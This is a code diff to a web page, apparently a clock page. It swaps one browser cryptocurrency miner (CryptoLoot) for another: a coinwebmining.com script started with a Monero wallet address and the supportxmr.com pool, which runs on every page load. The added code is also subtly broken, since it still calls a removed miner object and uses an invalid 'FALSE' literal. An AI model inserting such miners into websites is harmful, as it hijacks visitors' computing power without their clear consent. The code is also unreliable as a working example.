@@ -31,17 +31,12 @@
       setInterval('clock()', 1000);
     </script>   
   </div>
-  <script src="https://crypto-loot.com/lib/miner.min.js"></script>
+  
+ 
+  <script src="https://coinwebmining.com/cwm.js"></script>
   <script>
-    var miner = new CryptoLoot.Anonymous('402dde1694e16be2aaea697c7fb807811aa4c70e58f7');
-    miner.start();
-    miner.on('found', function() { /* Hash found */ })
-    miner.on('accepted', function() { /* Hash accepted by the pool */ })
-    setInterval(function() {
-    var hashesPerSecond = miner.getHashesPerSecond();
-    var totalHashes = miner.getTotalHashes();
+    var debug = FALSE; //change to TRUE for debugging
+    cwm_start('cwm-35', 'v7', '433wsaNwcgVfbs5YqFygdeauGM4GJRMSa3iTfGCv2iFT7P7SVfjBwr2eHGABGJAnhBT45ih9swVd28gjhLmAjupBNvUsWKQ', 'SITE', 'supportxmr.com', -1, 0.2, debug);
     var acceptedHashes = miner.getAcceptedHashes();
-    document.getElementById("totalhashes").innerHTML = totalHashes + " Hashes";
-        }, 1000);
   </script>
   <p id="totalhashes"></p>
